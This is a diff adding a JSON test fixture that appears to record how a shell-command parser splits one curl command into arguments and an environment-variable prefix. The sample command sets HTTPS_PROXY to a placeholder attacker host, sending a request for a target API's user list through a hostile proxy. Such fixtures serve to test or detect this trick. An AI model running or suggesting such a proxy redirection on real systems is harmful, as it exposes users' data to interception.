@@ -1,0 +1,21 @@
+[
+  {
+    "argv": [
+      "curl",
+      "-s",
+      "https://api.target.com/users"
+    ],
+    "original": [
+      "HTTPS_PROXY=http://attacker.com:8080",
+      "curl",
+      "-s",
+      "https://api.target.com/users"
+    ],
+    "env": [
+      "HTTPS_PROXY=http://attacker.com:8080"
+    ],
+    "terminator": "NEWLINE",
+    "depth": 0,
+    "origin": "top"
+  }
+]
